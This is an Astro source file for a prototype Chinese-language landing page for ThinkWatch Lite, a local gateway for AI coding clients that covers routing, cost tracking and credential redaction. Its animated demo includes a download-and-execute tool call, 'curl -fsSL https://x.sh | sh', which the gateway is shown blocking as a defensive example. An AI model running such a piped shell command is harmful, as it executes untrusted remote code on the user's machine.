---
// Prototype of a redesigned Lite page (not linked, not indexed). Direction:
// near-black neutral ground, the brand's neon pair from the desktop app's mark
// as the accent, large tight headings, white pill buttons, hairlines instead of
// boxed cards, and the product shown in motion. A palette switcher (prototype
// only) compares accents. See the review thread before rolling any of it out.
import Base from "~/layouts/Base.astro";
import TwMark from "~/components/proto/TwMark.astro";
import { getLatestLiteRelease } from "~/lib/github";

const release = await getLatestLiteRelease();
const version = release?.tag.replace(/^v/, "") ?? null;
const dmg =
  Object.entries(release?.assets ?? {}).find(([n]) => n.endsWith("-arm64.dmg"))?.[1] ??
  "https://github.com/ThinkWatchProject/ThinkWatch-Lite/releases/latest";

const clients = ["Claude Code", "Codex", "Claude Desktop", "opencode", "Cursor", "Zed", "Aider", "DeepSeek Harness", "Continue", "Antigravity CLI"];

const story = [
  {
    id: "routing",
    tag: "路由",
    title: "按规则分流，失败自动换",
    body: "按模型、工具、图片、扩展思考等条件把请求分给不同上游。回答开始前上游出错时换用下一个，同一会话固定使用同一上游，提示缓存保持有效。",
  },
  {
    id: "security",
    tag: "防护",
    title: "密钥不交给中转站，恶意工具调用到不了本机",
    body: "请求发出前，API 密钥、私钥与 JWT 可以换成占位符；回答里若出现下载即执行、外发凭据之类的工具调用，会在客户端执行之前被切断。",
  },
  {
    id: "traffic",
    tag: "追溯",
    title: "每个请求都说得清去向",
    body: "命中的规则、尝试过的每个上游、格式转换与费用依据，都在请求详情里。已结束的请求可以重放到另一个上游，并排对比。",
  },
  {
    id: "overview",
    tag: "费用",
    title: "费用如实计算",
    body: "按模型与上游统计 token、费用、缓存节省与首 token 时间。估算的金额单独标注，无法计价的请求单独计数，不按零计入。",
  },
];

const palettes = [
  { id: "neon", label: "霓虹双色（logo 同款）" },
  { id: "teal", label: "现在的青色" },
  { id: "indigo", label: "靛紫" },
  { id: "amber", label: "暖橙" },
];
---

<Base title="ThinkWatch Lite · 原型" description="Lite 页重新设计的原型" noindex analytics={false}>
  <div class="proto" data-palette="neon">
    <header class="nav">
      <div class="wrap nav-inner">
        <a href="/zh-CN/" class="brand"><TwMark id="m-nav" size={22} />ThinkWatch</a>
        <nav class="nav-links" aria-label="主导航">
          <a href="/zh-CN/lite/" aria-current="page">Lite</a>
          <a href="/zh-CN/thinkwatch/">企业版</a>
          <a href="/zh-CN/core/">Core</a>
          <a href="/zh-CN/docs/">文档</a>
          <a href="/zh-CN/changelog/">更新日志</a>
        </nav>
        <div class="nav-cta">
          <a class="ghost-link" href="https://github.com/ThinkWatchProject/ThinkWatch-Lite">GitHub</a>
          <a class="pill pill-sm" href="#download">下载</a>
        </div>
      </div>
    </header>

    <!-- Hero -->
    <section class="hero">
      <div class="aurora" aria-hidden="true"><i></i><i></i><i></i></div>
      <div class="grid-bg" aria-hidden="true"></div>
      <div class="wrap hero-grid">
        <div class="hero-copy">
          <a class="announce" href="/zh-CN/changelog/"><span class="dot"></span>{version ? `Lite ${version} 已发布` : "Lite 已发布"}<span class="chev">→</span></a>
          <h1 class="h-hero">
            <span class="line" style="--d:0">Claude Code、Codex 等</span>
            <span class="line" style="--d:1">AI 客户端的<span class="grad">本地网关</span></span>
          </h1>
          <p class="lede rise" style="--d:2">客户端只接入一次，之后换上游、换模型都在网关里完成。每个请求的费用与去向都有记录，密钥不交给中转站，恶意工具调用到不了本机。</p>
          <div class="hero-actions rise" style="--d:3">
            <a class="pill shine" href={dmg}>下载 macOS 版</a>
            <a class="ghost" href="#download">Windows 与 Linux</a>
          </div>
        </div>
        <div class="hero-mark" aria-hidden="true">
          <div class="mark-halo"></div>
          <TwMark id="m-hero" size={260} draw glow />
        </div>
      </div>

      <div class="wrap">
        <figure class="flow rise" style="--d:4" data-flow aria-label="示意：请求经过网关，依次展示正常请求脱敏、上游出错时换用下一个、危险工具调用被切断">
          <div class="flow-top">
            <span class="lights"><i></i><i></i><i></i></span>
            <span class="flow-title">ThinkWatch Lite · 实时流量</span>
            <span class="scenes" data-scenes><i data-on></i><i></i><i></i></span>
            <span class="live"><i></i>LIVE</span>
          </div>
          <div class="flow-grid" aria-hidden="true">
            <div class="col" data-clients>
              <p class="col-label">客户端</p>
              <div class="node">Claude Code</div>
              <div class="node">Codex</div>
              <div class="node">Cursor</div>
            </div>
            <div class="wire"><span class="packet"></span><span class="packet p2"></span></div>
            <div class="gw">
              <div class="gw-head"><TwMark id="m-gw" size={18} />网关</div>
              <ul class="checks" data-checks>
                <li data-step="1"><b></b><span></span></li>
                <li data-step="2"><b></b><span></span></li>
                <li data-step="3"><b></b><span></span></li>
                <li data-step="4"><b></b><span></span></li>
              </ul>
            </div>
            <div class="wire"><span class="packet late"></span><span class="packet late p2"></span></div>
            <div class="col" data-upstreams>
              <p class="col-label">上游</p>
              <div class="node">anthropic</div>
              <div class="node">chatgpt</div>
              <div class="node">relay</div>
            </div>
          </div>
          <ol class="log" data-log aria-hidden="true">
            <li data-step="0"></li>
            <li data-step="1"></li>
            <li data-step="2"></li>
            <li data-step="3"></li>
            <li data-step="4"></li>
          </ol>
        </figure>
      </div>
    </section>

    <!-- Client wall, scrolling -->
    <section class="wall">
      <p class="wall-label">一键接入，或按说明配置</p>
      <div class="marquee">
        <ul class="track">
          {[...clients, ...clients].map((c, i) => <li aria-hidden={i >= clients.length ? "true" : undefined}>{c}</li>)}
        </ul>
      </div>
    </section>

    <!-- Three ideas -->
    <section class="ideas">
      <div class="wrap">
        <h2 class="h-sec reveal">网关在本机，<span class="dim">控制权也在本机。</span></h2>
        <div class="idea-grid">
          <article class="idea reveal">
            <p class="fig">FIG 0.1</p>
            <svg viewBox="0 0 200 140" class="art" aria-hidden="true">
              <g class="float">
                <path pathLength="1" d="M100 20 L160 50 L100 80 L40 50 Z" class="ink hot" />
                <path pathLength="1" d="M40 62 L100 92 L160 62" class="ink" style="opacity:.7" />
                <path pathLength="1" d="M40 74 L100 104 L160 74" class="ink" style="opacity:.5" />
                <path pathLength="1" d="M40 86 L100 116 L160 86" class="ink" style="opacity:.3" />
              </g>
            </svg>
            <h3>一次接入，随时切换</h3>
            <p>七款客户端一键指向网关，写入前预览改动、备份原文件。之后换上游、换模型，客户端无需改配置或重启。</p>
          </article>
          <article class="idea reveal">
            <p class="fig">FIG 0.2</p>
            <svg viewBox="0 0 200 140" class="art" aria-hidden="true">
              <g class="float f2">
                <path pathLength="1" d="M100 18 L146 34 V70 C146 96 126 112 100 122 C74 112 54 96 54 70 V34 Z" class="ink hot" />
                <path pathLength="1" d="M100 30 L134 42 V70 C134 90 120 102 100 110 C80 102 66 90 66 70 V42 Z" class="ink" style="opacity:.5" />
                <circle pathLength="1" cx="100" cy="66" r="9" class="ink" />
                <path pathLength="1" d="M100 75 V90" class="ink" />
              </g>
            </svg>
            <h3>防范中转站</h3>
            <p>密钥在发出前替换，中转站拿不到原值；回答里塞进来的危险工具调用，在客户端执行之前切断。</p>
          </article>
          <article class="idea reveal">
            <p class="fig">FIG 0.3</p>
            <svg viewBox="0 0 200 140" class="art" aria-hidden="true">
              <g class="float f3">
                <path pathLength="1" d="M30 110 H170" class="ink" style="opacity:.4" />
                <path pathLength="1" d="M40 110 V60 M62 110 V44 M84 110 V70 M106 110 V32 M128 110 V56 M150 110 V40" class="ink" />
                <circle pathLength="1" cx="106" cy="32" r="4" class="ink hot" />
              </g>
            </svg>
            <h3>每个请求都可追溯</h3>
            <p>规则、尝试、格式转换与费用依据逐条记录，改规则前可以先试算，已结束的请求可以重放对比。</p>
          </article>
        </div>
      </div>
    </section>

    <!-- Scroll story -->
    <section class="story" data-story>
      <div class="wrap story-grid">
        <div class="story-steps">
          <h2 class="h-sec reveal">一个请求，<span class="dim">经过网关的四站。</span></h2>
          <div class="rail" aria-hidden="true"><i data-rail></i></div>
          {story.map((s, i) => (
            <div class="step" data-step-id={s.id} data-active={i === 0 ? "" : undefined}>
              <p class="step-tag"><span>0{i + 1}</span>{s.tag}</p>
              <h3>{s.title}</h3>
              <p>{s.body}</p>
            </div>
          ))}
        </div>
        <div class="story-screen">
          <div class="screen" data-tilt>
            {story.map((s, i) => (
              <img src={`/lite/${s.id}.webp`} alt="" width="2360" height="1540" loading="lazy" data-shot={s.id} data-active={i === 0 ? "" : undefined} />
            ))}
          </div>
        </div>
      </div>
    </section>

    <!-- Bento -->
    <section class="bento-sec">
      <div class="wrap">
        <h2 class="h-sec reveal">还有这些，<span class="dim">都在一个应用里。</span></h2>
        <div class="bento" data-bento>
          <article class="tile t-menubar reveal">
            <div class="tile-text">
              <div class="chip-bar" aria-hidden="true">
                <TwMark id="m-chip" size={16} />
                <span class="chip-nums"><b data-count="13.3" data-unit="M" data-step="0.1">13.3M</b><b data-count="9.34" data-prefix="$" data-step="0.03" data-fixed="2">$9.34</b></span>
              </div>
              <h3>菜单栏里的今日用量</h3>
              <p>今日 token 与费用常驻菜单栏，额度将尽变橙、用完变红；点开看各项额度与进行中的请求。Windows 与 Linux 在托盘。</p>
            </div>
            <img src="/lite/menubar-menu.webp" alt="" width="664" height="1072" loading="lazy" class="menu-shot" />
          </article>
          <article class="tile t-cost reveal">
            <p class="big"><span data-count="68.11" data-prefix="$" data-step="0.07" data-fixed="2">$68.11</span></p>
            <p class="big-sub">含估算 $0.441 · 13 条无法计价</p>
            <h3>估算与实测分开写</h3>
            <p>无法计价的请求单独计数，不当作零。</p>
          </article>
          <article class="tile t-formats reveal">
            <div class="chips" aria-hidden="true">
              <span>Anthropic Messages</span><span>OpenAI Chat</span><span>OpenAI Responses</span><span>Gemini</span>
            </div>
            <h3>四种接口自动互转</h3>
            <p>Codex 也能用只支持 Chat Completions 的模型。</p>
          </article>
          <article class="tile t-mcp reveal">
            <div class="crop-wrap"><img src="/lite/mcp.webp" alt="" width="2360" height="1540" loading="lazy" class="crop" /><span class="scan" aria-hidden="true"></span></div>
            <div class="tile-text">
              <h3>扫描 MCP、技能与钩子</h3>
              <p>八款客户端的 MCP 服务器并列显示，隐藏字符、提示注入与危险命令会被找出。</p>
            </div>
          </article>
          <article class="tile t-remote reveal">
            <svg viewBox="0 0 240 90" class="remote-art" aria-hidden="true">
              <g fill="none" stroke="currentColor" stroke-width="1">
                <rect x="10" y="25" width="64" height="40" rx="6" />
                <rect x="166" y="20" width="64" height="50" rx="6" />
                <path d="M74 45 H166" stroke-dasharray="3 4" class="dash" />
              </g>
              <circle r="3" class="dot-run"><animateMotion dur="1.8s" repeatCount="indefinite" path="M74 45 H166" /></circle>
              <text x="42" y="49" text-anchor="middle">Lite</text>
              <text x="198" y="49" text-anchor="middle">twcore</text>
            </svg>
            <h3>也能管理服务器上的网关</h3>
            <p>twcore 装在 Linux 服务器上，应用经 Noise 加密通道连接，不涉及证书。</p>
          </article>
          <article class="tile t-keys reveal">
            <ul class="keyrows" aria-hidden="true">
              <li><b>claude-code</b><span>main</span><em data-count="4.21" data-prefix="$" data-step="0.02" data-fixed="2">$4.21</em></li>
              <li><b>codex</b><span>main</span><em data-count="2.87" data-prefix="$" data-step="0.01" data-fixed="2">$2.87</em></li>
              <li><b>cursor</b><span>budget</span><em data-count="0.93" data-prefix="$" data-step="0.01" data-fixed="2">$0.93</em></li>
            </ul>
            <h3>每个客户端一把密钥</h3>
            <p>流量与费用按客户端分开，路由与可见模型各自设置。</p>
          </article>
        </div>
      </div>
    </section>

    <!-- Download -->
    <section class="cta" id="download">
      <div class="cta-glow" aria-hidden="true"></div>
      <div class="wrap cta-inner">
        <TwMark id="m-cta" size={72} glow />
        <h2 class="h-cta reveal">下载 ThinkWatch Lite</h2>
        <p class="lede center">macOS 12 及以上（Apple silicon）、Windows 10 21H2 及以上（x64、ARM64）、Linux（x86_64、aarch64）。MIT 开源，自动更新。</p>
        <div class="hero-actions center">
          <a class="pill shine" href={dmg}>下载 macOS 版</a>
          <a class="ghost" href="/zh-CN/lite/#install">Windows 与 Linux</a>
        </div>
        <div class="cmd"><span>$</span> <code data-type="brew install --cask thinkwatchproject/tap/thinkwatch-lite">brew install --cask thinkwatchproject/tap/thinkwatch-lite</code><i class="caret" aria-hidden="true"></i></div>
      </div>
    </section>

    <footer class="foot">
      <div class="wrap foot-inner">
        <span class="brand"><TwMark id="m-foot" size={18} />ThinkWatch</span>
        <span class="dim">原型 · 不代表最终设计</span>
      </div>
    </footer>

    <!-- Prototype only: compare accents -->
    <div class="palette" role="group" aria-label="配色（原型）">
      <span class="palette-label">配色</span>
      {palettes.map((p) => (
        <button type="button" data-set-palette={p.id} class={`sw sw-${p.id}`} title={p.label} aria-label={p.label} aria-pressed={p.id === "neon" ? "true" : "false"}></button>
      ))}
    </div>
  </div>
</Base>

<script is:inline>
  (() => {
    const root = document.querySelector(".proto");
    const reduce = matchMedia("(prefers-reduced-motion: reduce)").matches;

    // Palette switcher (prototype only).
    const setPalette = (id) => {
      root.dataset.palette = id;
      document.querySelectorAll("[data-set-palette]").forEach((b) => b.setAttribute("aria-pressed", String(b.dataset.setPalette === id)));
      try { localStorage.setItem("proto-palette", id); } catch {}
    };
    try { const saved = localStorage.getItem("proto-palette"); if (saved) setPalette(saved); } catch {}
    document.querySelectorAll("[data-set-palette]").forEach((b) => b.addEventListener("click", () => setPalette(b.dataset.setPalette)));

    // Hero flow: three scenes, each played step by step.
    const flow = document.querySelector("[data-flow]");
    const scenes = [
      {
        client: 0, up: [["on"], [], []],
        checks: [["路由", "main → anthropic"], ["出站脱敏", "1 处凭据"], ["工具调用审查", "通过"], ["记账", "$0.0124"]],
        log: [
          '<time>16:42:07</time><b>claude-code</b> POST /v1/messages · claude-sonnet-5',
          '<time>路由</time>命中规则 <b>main</b>，交给 <b>anthropic</b>',
          '<time>脱敏</time><code>sk-ant-api03-••••</code> 已替换为占位符，响应中还原',
          '<time>回答</time>流式返回 · 首 token 0.8 s',
          '<time>完成</time>12.4k token · 费用 $0.0124',
        ],
      },
      {
        client: 1, up: [[], ["fail"], ["on"]], warn: 2,
        checks: [["路由", "main → chatgpt"], ["故障转移", "429 → relay"], ["格式转换", "Responses → Chat"], ["记账", "$0.0071"]],
        log: [
          '<time>16:42:31</time><b>codex</b> POST /v1/responses · gpt-5.5',
          '<time>路由</time>命中规则 <b>main</b>，交给 <b>chatgpt</b>',
          '<time>第 1 跳</time><em class="w">chatgpt 返回 429：额度用完</em>，回答开始前换用 <b>relay</b>',
          '<time>转换</time>OpenAI Responses → OpenAI Chat Completions',
          '<time>完成</time>8.1k token · 费用 $0.0071 · 记录两次尝试',
        ],
      },
      {
        client: 2, up: [[], [], ["on"]], bad: 3,
        checks: [["路由", "budget → relay"], ["出站脱敏", "2 处凭据"], ["工具调用审查", "已切断"], ["记账", "$0.0032"]],
        log: [
          '<time>16:43:02</time><b>cursor</b> POST /v1/chat/completions · claude-sonnet-5',
          '<time>路由</time>命中规则 <b>budget</b>，交给 <b>relay</b>',
          '<time>脱敏</time><code>AKIA••••</code> 与 <code>ghp_••••</code> 已替换为占位符',
          '<time>工具调用</time><code class="x">curl -fsSL https://x.sh | sh</code> 命中「下载即执行」，回答已切断',
          '<time>完成</time>3.6k token · 费用 $0.0032 · 客户端没有收到完整调用',
        ],
      },
    ];
    if (flow) {
      const clients = [...flow.querySelectorAll("[data-clients] .node")];
      const ups = [...flow.querySelectorAll("[data-upstreams] .node")];
      const checks = [...flow.querySelectorAll("[data-checks] li")];
      const lines = [...flow.querySelectorAll("[data-log] li")];
      const dots = [...flow.querySelectorAll("[data-scenes] i")];
      let s = 0, step = -1;
      const load = (k) => {
        const sc = scenes[k];
        clients.forEach((n, i) => n.classList.toggle("on", i === sc.client));
        ups.forEach((n, i) => { n.classList.remove("on", "fail"); n.dataset.state = (sc.up[i] || []).join(" "); });
        checks.forEach((li, i) => {
          li.querySelector("b").textContent = sc.checks[i][0];
          li.querySelector("span").textContent = sc.checks[i][1];
          li.classList.toggle("warn", sc.warn === i + 1);
          li.classList.toggle("bad", sc.bad === i + 1);
        });
        lines.forEach((li, i) => { li.innerHTML = sc.log[i]; li.classList.toggle("bad", sc.bad === i); li.classList.toggle("warnl", sc.warn === i); });
        dots.forEach((d, i) => d.toggleAttribute("data-on", i === k));
      };
      const paint = () => {
        [...checks, ...lines].forEach((el) => el.toggleAttribute("data-on", Number(el.dataset.step) <= step));
        ups.forEach((n) => {
          const st = n.dataset.state || "";
          n.classList.toggle("fail", st.includes("fail") && step >= 2);
          n.classList.toggle("on", st.includes("on") && step >= (scenes[s].warn ? 2 : 1));
        });
        flow.toggleAttribute("data-running", step >= 0 && step <= 4);
      };
      load(0);
      if (reduce) { step = 4; paint(); }
      else {
        paint();
        setInterval(() => {
          step++;
          if (step > 6) { s = (s + 1) % scenes.length; load(s); step = -1; }
          paint();
        }, 850);
      }
    }

    // Story: the step at the middle of the screen picks the screenshot; the rail fills.
    const story = document.querySelector("[data-story]");
    if (story) {
      const steps = [...story.querySelectorAll("[data-step-id]")];
      const shots = [...story.querySelectorAll("[data-shot]")];
      const rail = story.querySelector("[data-rail]");
      const io = new IntersectionObserver((entries) => {
        for (const e of entries) {
          if (!e.isIntersecting) continue;
          const id = e.target.dataset.stepId;
          steps.forEach((x) => x.toggleAttribute("data-active", x === e.target));
          shots.forEach((x) => x.toggleAttribute("data-active", x.dataset.shot === id));
        }
      }, { rootMargin: "-45% 0px -45% 0px" });
      steps.forEach((x) => io.observe(x));
      const fill = () => {
        const first = steps[0].getBoundingClientRect(), last = steps[steps.length - 1].getBoundingClientRect();
        const mid = innerHeight / 2;
        const p = Math.min(1, Math.max(0, (mid - first.top) / (last.bottom - first.top)));
        rail.style.transform = `scaleY(${p})`;
      };
      addEventListener("scroll", fill, { passive: true }); fill();
      const tilt = story.querySelector("[data-tilt]");
      if (tilt && !reduce) {
        tilt.addEventListener("pointermove", (e) => {
          const r = tilt.getBoundingClientRect();
          const x = (e.clientX - r.left) / r.width - 0.5, y = (e.clientY - r.top) / r.height - 0.5;
          tilt.style.transform = `perspective(1400px) rotateY(${x * 4}deg) rotateX(${-y * 4}deg)`;
        });
        tilt.addEventListener("pointerleave", () => (tilt.style.transform = ""));
      }
    }

    // Bento: a light that follows the pointer.
    document.querySelectorAll(".tile").forEach((t) => {
      t.addEventListener("pointermove", (e) => {
        const r = t.getBoundingClientRect();
        t.style.setProperty("--mx", `${e.clientX - r.left}px`);
        t.style.setProperty("--my", `${e.clientY - r.top}px`);
      });
    });

    if (reduce) return;

    // Entrances: mark blocks as they come into view.
    root.classList.add("js-reveal");
    const rio = new IntersectionObserver((entries) => {
      for (const e of entries) if (e.isIntersecting) { e.target.setAttribute("data-in", ""); rio.unobserve(e.target); }
    }, { rootMargin: "0px 0px -8% 0px" });
    document.querySelectorAll(".reveal").forEach((el) => rio.observe(el));

    // Counters that tick up while on screen.
    const counters = [...document.querySelectorAll("[data-count]")];
    setInterval(() => {
      counters.forEach((el) => {
        if (Math.random() < 0.55) return;
        const v = (parseFloat(el.dataset.count) + parseFloat(el.dataset.step) * (0.5 + Math.random()));
        el.dataset.count = String(v);
        const txt = (el.dataset.prefix || "") + v.toFixed(Number(el.dataset.fixed || 1)) + (el.dataset.unit || "");
        el.textContent = txt;
        el.classList.remove("tick"); void el.offsetWidth; el.classList.add("tick");
      });
    }, 1400);

    // The install command types itself once when it comes into view.
    const code = document.querySelector("[data-type]");
    if (code) {
      const full = code.dataset.type;
      const io2 = new IntersectionObserver(([e]) => {
        if (!e.isIntersecting) return;
        io2.disconnect();
        let i = 0; code.textContent = "";
        const t = setInterval(() => { code.textContent = full.slice(0, ++i); if (i >= full.length) clearInterval(t); }, 28);
      }, { threshold: 0.6 });
      io2.observe(code);
    }
  })();
</script>

